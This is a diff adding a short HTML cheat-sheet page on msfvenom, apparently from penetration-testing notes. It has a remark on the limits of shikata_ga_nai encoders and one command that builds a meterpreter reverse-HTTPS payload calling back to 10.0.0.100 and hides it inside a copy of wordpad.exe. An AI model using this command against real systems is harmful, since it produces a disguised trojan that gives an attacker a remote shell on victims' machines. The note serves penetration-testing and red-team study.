@@ -1,0 +1,8 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>MSFVenom</title>
+</head><body><i>Note:  You may see references to utilizing polymorphic encoders (specifically shikata_ga_nai) within Metasploit as a viable method for evading detection.  While these types of encoders did have an unintended side-effect of bypassing a/v in the past, this often doesn’t hold true with modern detection software.  The primary purpose of encoders is to remove bad characters (<span style="font-family: courier new">x00</span>, <span style="font-family: courier new">x0A</span>, etc.) from shellcode that might cause undesirable results in a program.</i><br/>
+<br/>
+msfvenom -p windows/meterpreter/reverse_https -e x86/shikata_ga_nai LHOST=10.0.0.100 LPORT=443 -x wordpad.exe -k -f exe -o wordpad1.exe &nbsp;&#09;&#09;-x use wordpad.exe as a template</body></html>
